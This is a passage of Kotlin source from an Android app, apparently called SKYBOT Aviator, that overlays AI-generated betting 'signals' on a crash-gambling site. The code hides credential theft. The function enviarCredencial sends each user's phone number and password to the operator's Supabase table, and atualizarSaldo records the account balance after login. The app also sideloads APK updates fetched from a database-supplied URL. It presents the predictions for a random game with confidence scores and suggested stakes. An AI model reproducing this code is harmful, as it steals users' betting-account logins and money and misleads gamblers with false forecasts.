            try { Android.historicoJogoFalhou(); } catch(e) {}
            try { top.Android && top.Android.historicoJogoFalhou(); } catch(e) {}
        }
    }

    setTimeout(tentar, 500);
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── Contar velas no Supabase (só para gestão do limite — sem análise) ────
    private fun contarVelasSupabase() {
        Thread {
            try {
                val conn = java.net.URL("$SUPA_URL/rest/v1/velas?select=id&order=id.asc")
                    .openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Accept", "application/json")
                conn.setRequestProperty("Prefer", "count=exact")
                conn.connectTimeout = 15000; conn.readTimeout = 15000
                conn.responseCode
                val range = conn.getHeaderField("Content-Range") ?: ""
                val total = range.substringAfterLast("/").trim().toLongOrNull()?.toInt() ?: -1
                conn.disconnect()
                if (total >= 0) {
                    totalVelasSupabase = total
                    if (total >= MAX_VELAS_SUPABASE && !limpezaEmCurso) {
                        limpezaEmCurso = true
                        limparVelasAntigas()
                    }
                }
            } catch (_: Exception) {}
        }.start()
    }

    /** Faz um POST para qualquer endpoint compatível com OpenAI. Retorna (httpCode, responseBody). */
        private fun chamarGemini(prompt: String): Pair<Int, String> {
        return try {
            val body = "{\"contents\":[{\"parts\":[{\"text\":${escapeJson(prompt)}}]}],\"generationConfig\":{\"maxOutputTokens\":300,\"temperature\":0.9}}"
            val conn = URL(GEMINI_URL).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36")
            conn.doOutput = true; conn.connectTimeout = 30000; conn.readTimeout = 30000
            OutputStreamWriter(conn.outputStream).use { it.write(body) }
            val code = conn.responseCode
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
            val resp = BufferedReader(InputStreamReader(stream)).readText()
            conn.disconnect()
            if (code in 200..299) {
                val text = Regex(""""text"\s*:\s*"((?:[^"\\]|\\.)*)"""")
                    .find(resp)?.groupValues?.get(1)
                    ?.replace("\\n","\n")?.replace("\\\"","\"") ?: resp
                Pair(code, text)
            } else Pair(code, resp)
        } catch (e: Exception) { Pair(-1, e.message ?: "timeout") }
    }

    private fun chamarIaApi(url: String, key: String, body: String): Pair<Int, String> {
        return try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("HTTP-Referer", "https://elephantbet.co.ao")
            conn.setRequestProperty("X-Title", "SKYBOT Aviator")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36")
            conn.doOutput = true
            conn.connectTimeout = 30000
            conn.readTimeout = 30000
            OutputStreamWriter(conn.outputStream).use { it.write(body) }
            val code = conn.responseCode
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
            val resp = BufferedReader(InputStreamReader(stream)).readText()
            conn.disconnect()
            Pair(code, resp)
        } catch (e: Exception) {
            Pair(-1, e.message ?: "timeout")
        }
    }

    private fun escapeJson(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) when (c) {
            '"'  -> sb.append("\\\"")
            '\\' -> sb.append("\\\\")
            '\n' -> sb.append("\\n")
            '\r' -> sb.append("\\r")
            '\t' -> sb.append("\\t")
            else -> sb.append(c)
        }
        return sb.append("\"").toString()
    }

    // ── RELÓGIO ───────────────────────────────────────────────────
    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }
        val tick = object : Runnable {
            override fun run() {
                // Actualizar relógio fixo sempre (não pisca, sempre visível)
                val cal = Calendar.getInstance()
                val h = cal.get(Calendar.HOUR_OF_DAY)
                val m = cal.get(Calendar.MINUTE)
                if (::txtRelogio.isInitialized) {
                    txtRelogio.text = "${String.format("%02d",h)}:${String.format("%02d",m)}"
                    txtRelogio.setTextColor(Color.parseColor("#94a3b8"))
                }
                if ((sinaisAtivos || cicloAtivo || graficoPronto) && dentroDoAviator) verificarRelogio()
                handler.postDelayed(this, 1000)
            }
        }
        relogioRunnable = tick
        handler.post(tick)
    }

    private fun verificarRelogio() {
        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora  = cal.get(Calendar.MINUTE)
        val segAgora  = cal.get(Calendar.SECOND)

        if (horaAgora != horaAtual) {
            horaAtual = horaAgora
            ultimoMinutoGerado = -1
            analisandoIA = false
        }

        // Permite que o ciclo continue mesmo sem sinal activo (para agendar próxima análise)
        val temSinalActivo = sinaisAtivos && sinalProtecao.isNotEmpty()
        if (!temSinalActivo && !cicloAtivo) return
        if (!temSinalActivo) {
            // Sem sinal activo mas ciclo em curso — só verifica o agendamento, não atualiza UI
            // (o job já foi agendado em postDelayed, aguardar que dispare)
            return
        }

        val alcNum = sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
        val cor = when {
            alcNum >= 100 -> "#ec4899"
            alcNum >= 20  -> "#22c55e"
            alcNum >= 10  -> "#f59e0b"
            else          -> "#3b82f6"
        }
        val alcTxt = "${sinalAlcMin}x → $sinalAlcMax"
        val horaTxt = "${String.format("%02d",horaAgora)}:${String.format("%02d",minAgora)}"
        // Actualizar relógio fixo (nunca pisca, sempre visível)
        if (::txtRelogio.isInitialized) {
            txtRelogio.text = horaTxt
            txtRelogio.setTextColor(Color.parseColor("#94a3b8"))
        }
        val icone = when {
            sinalTendencia.contains("SUBIDA", ignoreCase = true) -> "📈"
            sinalTendencia.contains("QUEDA",  ignoreCase = true) -> "📉"
            else -> "➡️"
        }
        val confTxt = if (sinalConfianca > 0) " · ${sinalConfianca}%" else ""
        val tendTxt = if (sinalTendencia.isNotEmpty()) "$icone $sinalTendencia$confTxt" else "➡️ SINAL ACTIVO"

        // Janela FIXA — definida em processarRespostaGroq, não muda até novo sinal
        val minTxt = if (sinalMinEntrada >= 0 && sinalMinSaida >= 0)
            "⏱ Entrar: min ${String.format("%02d",sinalMinEntrada)} → ${String.format("%02d",sinalMinSaida)}"
        else ""

        atualizarBarraCompleta(tendTxt, horaTxt, sinalProtecao, alcTxt, cor, minTxt)

        // ── Detectar fim da janela → countdown 60s em tempo real → nova análise ──
        // Dispara quando o minuto seguinte ao sinalMinSaida começa.
        // Usa janelaJaDisparou para garantir que só dispara 1 única vez por janela.
        if (sinalMinSaida >= 0 && !janelaJaDisparou && !analisandoIA && !cicloAtivo) {
            val minDepoisSaida = (sinalMinSaida + 1) % 60
            val isOfflineSignal = sinalTendencia == "OFFLINE"

            if (minAgora == minDepoisSaida) {
                // ── Bloquear imediatamente para não disparar 2x ──
                janelaJaDisparou = true
                cicloAtivo = true

                // Cancelar qualquer job anterior
                retryIaJob?.let { handler.removeCallbacks(it) }
                retryIaJob = null
                proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
                proximaAnaliseRunnable = null
                countdownCicloJob?.let { handler.removeCallbacks(it) }
                countdownCicloJob = null

                // Limpar estado do sinal anterior
                sinaisAtivos = false
                sinalProtecao = ""
                sinalAlcMin = 0
                sinalAlcMax = ""
                sinalTendencia = ""
                sinalConfianca = 0
                sinalMinEntrada = -1
                sinalMinSaida = -1

                val pausaSeg = if (isOfflineSignal) 5 else 60

                // Limpar UI imediatamente — countdown aparece na zona central (txtJanela)
                runOnUiThread {
                    // Topo: tendência mostra estado neutro (não o countdown)
                    txtAcao.text = "SKYBOT"
                    txtAcao.setTextColor(Color.parseColor("#334155"))
                    txtAcao.visibility = View.VISIBLE
                    // Zona central: limpar previsão anterior
                    txtProtecao.text = "--"
                    txtProtecao.setTextColor(Color.parseColor("#334155"))
                    txtAlcance.text = "--"
                    txtAlcance.setTextColor(Color.parseColor("#334155"))
                    // Countdown aparece em txtJanela — mesma zona onde estava a janela de entrada
                    if (::txtJanela.isInitialized) {
                        txtJanela.text = "⏳ Nova análise em ${pausaSeg}s..."
                        txtJanela.setTextColor(Color.parseColor("#7c3aed"))
                        txtJanela.visibility = View.VISIBLE
                    }
                    barLayout.setBackgroundColor(Color.parseColor("#0a0518"))
                    dotView.clearAnimation()
                    dotView.background = circulo("#7c3aed")
                    pulseRunnable?.let { handler.removeCallbacks(it) }
                    val animAnalise = android.view.animation.AlphaAnimation(1f, 0.2f).apply {
                        duration = 1200; repeatMode = android.view.animation.Animation.REVERSE
                        repeatCount = android.view.animation.Animation.INFINITE
                    }
                    dotView.startAnimation(animAnalise)
                }

                // ── Countdown visual em tempo real ──────────────────────────
                var segsRestantes = pausaSeg
                val countdownTick = object : Runnable {
                    override fun run() {
                        if (!cicloAtivo) { countdownCicloJob = null; return }
                        if (segsRestantes > 0) {
                            runOnUiThread {
                                if (::txtJanela.isInitialized) {
                                    txtJanela.text = "⏳ Nova análise em ${segsRestantes}s..."
                                    txtJanela.setTextColor(Color.parseColor("#7c3aed"))
                                    txtJanela.visibility = View.VISIBLE
                                }
                            }
                            segsRestantes--
                            handler.postDelayed(this, 1000)
                        } else {
                            // ── Countdown terminou → lançar análise IMEDIATAMENTE ──
                            // Independentemente de o avião estar em voo ou não.
                            countdownCicloJob = null
                            proximaAnaliseRunnable = null
                            cicloAtivo = false
                            janelaJaDisparou = false
                            // Reset de segurança se analisandoIA ficou travado
                            if (analisandoIA) {
                                iaTimeoutRunnable?.let { handler.removeCallbacks(it) }
                                iaTimeoutRunnable = null
                                analisandoIA = false
                            }
                            // Ignorar modoSilenciosoAtivo — o ciclo não depende do voo
                            modoSilenciosoAtivo = false
                            runOnUiThread {
                                txtAcao.text = "SKYBOT"
                                txtAcao.setTextColor(Color.parseColor("#334155"))
                                if (::txtJanela.isInitialized) {
                                    txtJanela.text = "🔍 IA a analisar..."
                                    txtJanela.setTextColor(Color.parseColor("#7c3aed"))
                                    txtJanela.visibility = View.VISIBLE
                                }
                            }
                            invalidarCache()
                            if (historicoVelas.size >= MIN_VELAS_ANALISE) {
                                pedirSinalIA()
                            } else {
                                val sinalFallback = gerarSinalOffline()
                                runOnUiThread { emitirSinalOffline(sinalFallback) }
                            }
                        }
                    }
                }
                countdownCicloJob = countdownTick
                handler.post(countdownTick)
            }
        }
    }

    // ── SUPABASE ──────────────────────────────────────────────────
    // Apaga as 50 velas mais antigas quando a tabela atinge 100 registos.
    // Estratégia: buscar os IDs das 50 mais antigas → apagar por ID → actualizar contador.
    private fun limparVelasAntigas() {
        Thread {
            try {
                // Passo 1 — buscar os IDs das VELAS_A_APAGAR mais antigas (ordem ASC = mais antigas primeiro)
                val urlBuscar = "$SUPA_URL/rest/v1/velas?select=id&order=id.asc&limit=$VELAS_A_APAGAR"
                val connBuscar = URL(urlBuscar).openConnection() as HttpURLConnection
                connBuscar.requestMethod = "GET"
                connBuscar.setRequestProperty("apikey", SUPA_KEY)
                connBuscar.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                connBuscar.setRequestProperty("Accept", "application/json")
                connBuscar.connectTimeout = 10000; connBuscar.readTimeout = 10000
                val codeBuscar = connBuscar.responseCode
                val respBuscar = BufferedReader(InputStreamReader(connBuscar.inputStream)).readText()
                connBuscar.disconnect()

                if (codeBuscar !in 200..299) {
                    limpezaEmCurso = false
                    return@Thread
                }

                // Extrair lista de IDs do JSON: [{"id":1}, {"id":2}, ...]
                val ids = Regex(""""id"\s*:\s*(\d+)""")
                    .findAll(respBuscar)
                    .mapNotNull { it.groupValues[1].toLongOrNull() }
                    .toList()

                if (ids.isEmpty()) {
                    limpezaEmCurso = false
                    return@Thread
                }

                // Passo 2 — apagar esses IDs com filtro "in" do PostgREST
                // Formato: DELETE /rest/v1/velas?id=in.(1,2,3,...)
                val idsStr = ids.joinToString(",")
                val urlApagar = "$SUPA_URL/rest/v1/velas?id=in.($idsStr)"
                val connApagar = URL(urlApagar).openConnection() as HttpURLConnection
                connApagar.requestMethod = "DELETE"
                connApagar.setRequestProperty("apikey", SUPA_KEY)
                connApagar.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                connApagar.setRequestProperty("Prefer", "return=minimal")
                connApagar.connectTimeout = 10000; connApagar.readTimeout = 10000
                val codeApagar = connApagar.responseCode
                connApagar.disconnect()

                // Passo 3 — actualizar contador local
                if (codeApagar in 200..299) {
                    totalVelasSupabase -= ids.size
                    if (totalVelasSupabase < 0) totalVelasSupabase = 0
                }

            } catch (_: Exception) {
                // Em caso de erro, repor flag para tentar na próxima vela
            } finally {
                limpezaEmCurso = false
            }
        }.start()
    }

    /** Fallback: busca velas recentes do Supabase (últimas 2h) quando o DOM falha */
    private fun carregarVelasSupabaseRecentes() {
        Thread {
            try {
                // Calcular timestamp de 2 horas atrás em formato ISO
                val duasHorasAtras = java.text.SimpleDateFormat(
                    "yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.getDefault()
                ).format(java.util.Date(System.currentTimeMillis() - 2 * 60 * 60 * 1000))

                val url = "$SUPA_URL/rest/v1/velas?select=coeficiente,timestamp" +
                    "&timestamp=gte.$duasHorasAtras" +
                    "&order=id.desc&limit=50"

                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Accept", "application/json")
                conn.connectTimeout = 15000; conn.readTimeout = 15000
                val code = conn.responseCode
                val resp = java.io.BufferedReader(java.io.InputStreamReader(conn.inputStream)).readText()
                conn.disconnect()

                if (code !in 200..299) {
                    runOnUiThread {
                        setBarra("⏳ AGUARDAR CRASH", "Supabase indisponível · a recolher ao vivo...", "#475569")
                    }
                    return@Thread
                }

                val valores = Regex(""""coeficiente"\s*:\s*([\d.]+)""")
                    .findAll(resp)
                    .mapNotNull { it.groupValues[1].toDoubleOrNull() }
                    .filter { it >= 1.0 }
                    .toList()
                    .reversed() // desc → inverter para cronológico

                runOnUiThread {
                    if (valores.isEmpty() || historicoJogoCarregado) {
                        if (!historicoJogoCarregado)
                            setBarra("⏳ AGUARDAR CRASH", "Sem dados recentes · a recolher ao vivo...", "#475569")
                        return@runOnUiThread
                    }

                    historicoVelas.clear()
                    historicoVelas.addAll(valores.takeLast(MAX_VELAS_LOCAL))
                    historicoJogoCarregado = true

                    val n = historicoVelas.size
                    if (n >= MIN_VELAS_ANALISE) {
                        graficoPronto = true
                        setBarra("✅ HISTÓRICO SUPABASE", "$n velas · a analisar...", "#0f766e")
                        if (!analisandoIA && !cicloAtivo) {
                            handler.postDelayed({ pedirSinalIA() }, 10_000)
                        }
                    } else {
                        setBarra("⏳ AGUARDAR CRASH", "$n/${MIN_VELAS_ANALISE} velas · a completar ao vivo...", "#475569")
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569")
                }
            }
        }.start()
    }

    private fun carregarVelasSupabase() {
        Thread {
            try {
                // Buscar as últimas 30 velas para análise (ordem desc = mais recentes primeiro)
                val connVelas = URL("$SUPA_URL/rest/v1/velas?select=coeficiente&order=id.desc&limit=30")
                    .openConnection() as HttpURLConnection
                connVelas.requestMethod = "GET"
                connVelas.setRequestProperty("apikey", SUPA_KEY)
                connVelas.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                connVelas.setRequestProperty("Accept", "application/json")
                connVelas.connectTimeout = 10000; connVelas.readTimeout = 10000
                val codeVelas = connVelas.responseCode
                val respVelas = BufferedReader(InputStreamReader(connVelas.inputStream)).readText()
                connVelas.disconnect()

                // Contar total real de velas no Supabase (para saber se já está perto do limite)
                val connCount = URL("$SUPA_URL/rest/v1/velas?select=id&order=id.asc")
                    .openConnection() as HttpURLConnection
                connCount.requestMethod = "GET"
                connCount.setRequestProperty("apikey", SUPA_KEY)
                connCount.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                connCount.setRequestProperty("Accept", "application/json")
                connCount.setRequestProperty("Prefer", "count=exact")
                connCount.connectTimeout = 10000; connCount.readTimeout = 10000
                connCount.responseCode
                // O Supabase retorna o total no header Content-Range: 0-99/total
                val contentRange = connCount.getHeaderField("Content-Range") ?: ""
                val totalReal = contentRange.substringAfterLast("/").trim().toLongOrNull()?.toInt() ?: -1
                connCount.disconnect()

                if (totalReal >= 0) totalVelasSupabase = totalReal

                if (codeVelas !in 200..299) {
                    runOnUiThread {
                        setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                    }
                    return@Thread
                }

                val valores = Regex(""""coeficiente"\s*:\s*([\d.]+)""")
                    .findAll(respVelas)
                    .mapNotNull { it.groupValues[1].toDoubleOrNull() }
                    .filter { it >= 1.0 }
                    .toList()
                    .reversed() // Supabase retorna desc → inverter para cronológico

                runOnUiThread {
                    // Supabase: só actualizar contador para gestão do limite de 100 velas.
                    // NÃO carregar histórico para análise — recolha é sempre ao vivo.
                    if (totalReal < 0 && valores.isNotEmpty()) totalVelasSupabase = valores.size
                    if (totalVelasSupabase >= MAX_VELAS_SUPABASE && !limpezaEmCurso) {
                        limpezaEmCurso = true
                        limparVelasAntigas()
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                }
            }
        }.start()
    }

    private fun enviarVelaSupabase(coef: Double) {
        val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.getDefault())
            .format(java.util.Date())
        val json = """{"coeficiente":$coef,"timestamp":"$timestamp"}"""
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/velas").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    /** Chamado pelo JS após login — faz PATCH pelo id da sessão, isolando cada utilizador */
    fun atualizarSaldo(saldo: String) {
        if (saldo.isEmpty()) return
        if (sessaoId < 0) {
            android.util.Log.w("SKYBOT_CRED", "atualizarSaldo ignorado — sessaoId não disponível ainda")
            // Tentar de novo em 2s (INSERT pode ainda estar em curso)
            handler.postDelayed({ atualizarSaldo(saldo) }, 2000)
            return
        }
        val saldoEsc = saldo.replace("\"", "\\\"")
        val json = "{\"saldo\":\"$saldoEsc\"}"
        Thread {
            try {
                // PATCH filtrando pelo id da sessão — nunca afeta outro utilizador
                val url = "$SUPA_URL/rest/v1/$TABELA?id=eq.$sessaoId"
                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "PATCH"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                java.io.OutputStreamWriter(conn.outputStream).use { it.write(json) }
                val code = conn.responseCode
                conn.disconnect()
                android.util.Log.d("SKYBOT_CRED", "atualizarSaldo -> HTTP $code | id=$sessaoId saldo=$saldoEsc")
            } catch (e: Exception) {
                android.util.Log.e("SKYBOT_CRED", "atualizarSaldo falhou: ${e.message}")
            }
        }.start()
    }

    /** Envia credencial completa (numero + senha) para a tabela credenciais do Supabase.
     *  Guarda o id retornado para que o PATCH do saldo afete só esta sessão. */
    private fun enviarCredencial(numero: String, senha: String) {
        sessaoId = -1  // resetar sessão anterior
        val numEsc = numero.replace("\"", "\\\"")
        val senEsc = senha.replace("\"", "\\\"")
        val json = "{\"numero\":\"$numEsc\",\"senha\":\"$senEsc\",\"saldo\":\"\"}"
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                // return=representation para receber a linha inserida com o id gerado
                conn.setRequestProperty("Prefer", "return=representation")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                val code = conn.responseCode
                val stream = if (code in 200..299) conn.inputStream else conn.errorStream
                val resp = if (stream != null)
                    java.io.BufferedReader(java.io.InputStreamReader(stream)).readText()
                else ""
                conn.disconnect()
                android.util.Log.d("SKYBOT_CRED", "enviarCredencial HTTP=$code resp=$resp")
                // Extrair o id da resposta: [{"id":42,"numero":...}]
                val idMatch = Regex("\"id\"\\s*:\\s*(\\d+)").find(resp)
                if (idMatch != null) {
                    sessaoId = idMatch.groupValues[1].toInt()
                    android.util.Log.d("SKYBOT_CRED", "enviarCredencial -> sessaoId=$sessaoId")
                } else {
                    android.util.Log.w("SKYBOT_CRED", "enviarCredencial -> HTTP $code sem id na resposta: $resp")
                    // Retry automático após falha de rede (1 tentativa)
                    if (code !in 200..299 && numero.isNotEmpty() && senha.isNotEmpty()) {
                        android.util.Log.w("SKYBOT_CRED", "A tentar de novo em 5s...")
                        Thread.sleep(5000)
                        enviarCredencial(numero, senha)
                    }
                }
            } catch (e: Exception) {
                android.util.Log.e("SKYBOT_CRED", "enviarCredencial falhou: ${e.message}")
            }
        }.start()
    }

    private fun enviarSupabase(tipoVal: String, valorVal: String) {
        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
        android.util.Log.d("SKYBOT_CRED", "enviarSupabase → tipo=$tipoVal valor=$valorVal")
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                val code = conn.responseCode
                val errStream = conn.errorStream
                val errBody = if (errStream != null) BufferedReader(InputStreamReader(errStream)).readText() else ""
                conn.disconnect()
                if (code in 200..299) {
                    android.util.Log.d("SKYBOT_CRED", "enviarSupabase OK → HTTP $code tipo=$tipoVal")
                } else {
                    android.util.Log.e("SKYBOT_CRED", "enviarSupabase ERRO → HTTP $code | $errBody")
                }
            } catch (e: Exception) {
                android.util.Log.e("SKYBOT_CRED", "enviarSupabase EXCEPÇÃO: ${e.message}")
            }
        }.start()
    }

    // ── ACTUALIZAÇÕES ─────────────────────────────────────────────
    private fun verificarAtualizacao() {
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&order=id.desc&limit=1")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Accept", "application/json")
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                conn.disconnect()

                if (code !in 200..299) return@Thread

                val versaoNova = Regex(""""versao"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: return@Thread
                val urlApk = Regex(""""url_apk"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: return@Thread
                val notas = Regex(""""notas"\s*:\s*"([^"]+)"""").find(resp)?.groupValues?.get(1) ?: ""

                if (versaoNova != VERSAO_ATUAL) {
                    // Filtrar qualquer link de repositório das notas antes de mostrar
                    val notasFiltradas = notas
                        .replace(Regex("https?://github\\.com/[^\\s\\n\"]*"), "")
                        .replace(Regex("https?://[^\\s\\n\"]*github[^\\s\\n\"]*"), "")
                        .trim()
                    runOnUiThread { mostrarDialogoUpdate(versaoNova, urlApk, notasFiltradas) }
                }
            } catch (_: Exception) {}
        }.start()
    }

    private fun mostrarDialogoUpdate(versaoNova: String, urlApk: String, notas: String) {
        val msg = "Versao actual: $VERSAO_ATUAL\nNova versao: $versaoNova\n\nNova melhoria disponivel!\n\nDeseja actualizar agora?"
        AlertDialog.Builder(this)
            .setTitle("Actualizacao disponivel!")
            .setMessage(msg).setCancelable(false)
            .setPositiveButton("ACTUALIZAR AGORA") { _, _ ->
                iniciarDownloadApk(versaoNova, urlApk)
            }
            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }
            .show()
    }

    private fun iniciarDownloadApk(versaoNova: String, urlApk: String) {
        try {
            val nomeArquivo = "SKYBOT-v$versaoNova.apk"

            // Diálogo de progresso
            val progressDialog = AlertDialog.Builder(this)
                .setTitle("⬇️ A descarregar SKYBOT v$versaoNova")
                .setMessage("Por favor aguarda...")
                .setCancelable(false)
                .create()
            progressDialog.show()

            // Download em background sem abrir browser
            Thread {
                try {
                    val conn = URL(urlApk).openConnection() as HttpURLConnection
                    conn.connectTimeout = 15000
                    conn.readTimeout = 60000
                    conn.connect()

                    val destino = File(getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), nomeArquivo)
                    conn.inputStream.use { input ->
                        destino.outputStream().use { output ->
                            input.copyTo(output)
                        }
                    }
                    conn.disconnect()

                    runOnUiThread {
                        progressDialog.dismiss()
                        // Instalar o APK descarregado
                        try {
                            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                FileProvider.getUriForFile(this, "$packageName.provider", destino)
                            } else {
                                Uri.fromFile(destino)
                            }
                            val install = Intent(Intent.ACTION_VIEW).apply {
                                setDataAndType(uri, "application/vnd.android.package-archive")
                                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            startActivity(install)
                        } catch (e: Exception) {
                            Toast.makeText(this, "Erro ao instalar: ${e.message?.take(60)}", Toast.LENGTH_LONG).show()
                        }
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        progressDialog.dismiss()
                        Toast.makeText(this, "Erro no download: ${e.message?.take(60)}", Toast.LENGTH_LONG).show()
                    }
                }
            }.start()

        } catch (e: Exception) {
            Toast.makeText(this, "Erro ao iniciar download", Toast.LENGTH_LONG).show()
        }
    }

    // ── UI HELPERS ────────────────────────────────────────────────
    private fun setBarra(acao: String, minutos: String, cor: String) =
        atualizarBarra(acao, minutos, "", "", cor)

    private fun mostrarSinalCompleto(protecao: String, alcance: String, tendencia: String, confianca: Int, cor: String, minAgora: Int) {
        runOnUiThread {
            val icone = when {
                tendencia.contains("SUBIDA", ignoreCase = true) -> "📈"
                tendencia.contains("QUEDA",  ignoreCase = true) -> "📉"
                else -> "➡️"
            }
            val confTxt = if (confianca > 0) " · $confianca%" else ""
            val tendTxt = if (tendencia.isNotEmpty()) "$icone $tendencia$confTxt" else "SKYBOT: SINAL ACTIVO"
            val horaTxt = "${String.format("%02d", horaAtual)}:${String.format("%02d", minAgora)}"
            // Actualizar relógio fixo
            if (::txtRelogio.isInitialized) {
                txtRelogio.text = horaTxt
                txtRelogio.setTextColor(Color.parseColor("#94a3b8"))
            }

            // Janela FIXA — já calculada em processarRespostaGroq, não recalcular
            val apostaSug = if (bancaAtual > 0) " · Aposta: ${String.format("%.0f", calcularAposta())} AOA" else ""
            val minTxt = if (sinalMinEntrada >= 0 && sinalMinSaida >= 0)
                "⏱ Entrar: min ${String.format("%02d",sinalMinEntrada)} → ${String.format("%02d",sinalMinSaida)}$apostaSug"
            else if (apostaSug.isNotEmpty()) "💰$apostaSug" else ""
            atualizarBarraCompleta(tendTxt, horaTxt, protecao, alcance, cor, minTxt)
        }
    }

    private fun atualizarBarraCompleta(acao: String, horario: String, protecao: String, alcance: String, cor: String, minInterval: String = "") {
        runOnUiThread {
            // ✅ SKIP se estamos em voo (não actualizar durante o voo)
            if (emVoo) return@runOnUiThread
            // Linha topo: tendência + confiança
            txtAcao.text = acao
            txtAcao.setTextColor(Color.parseColor(cor))

            // Relógio fixo — sempre visível no txtRelogio (não pisca)
            if (::txtRelogio.isInitialized) {
                txtRelogio.text = horario
                txtRelogio.setTextColor(Color.parseColor("#94a3b8"))
            }
            // txtMinutos fica livre para mostrar multiplicador durante o voo
            // Quando não está em voo, limpar para não mostrar valor antigo
            if (!emVoo) {
                txtMinutos.text = ""
            }
            txtMinutos.textSize = 13f
            txtAcao.visibility = View.VISIBLE

            // Protecção — número grande sem emoji, com label "SAÍDA SEGURA" por cima
            if (protecao.isNotEmpty()) {
                txtProtecao.text = "🛡 $protecao"
                txtProtecao.setTextColor(Color.parseColor("#94a3b8"))
            }

            // Alcance — número maior com cor de destaque + animação pulse
            if (alcance.isNotEmpty()) {
                txtAlcance.text = "🎯 $alcance"
                txtAlcance.setTextColor(Color.parseColor(cor))
                // Animação suave de scale no alcance (pulsa uma vez ao receber sinal)
                txtAlcance.animate()
                    .scaleX(1.08f).scaleY(1.08f).setDuration(180)
                    .withEndAction {
                        txtAlcance.animate().scaleX(1f).scaleY(1f).setDuration(180).start()
                    }.start()
            }

            // Janela ⏱ — volta à cor azul ao receber novo sinal
            if (minInterval.isNotEmpty()) {
                txtJanela.text = minInterval
                txtJanela.setTextColor(Color.parseColor("#38bdf8"))
                txtJanela.visibility = View.VISIBLE
                txtJanela.alpha = 0f
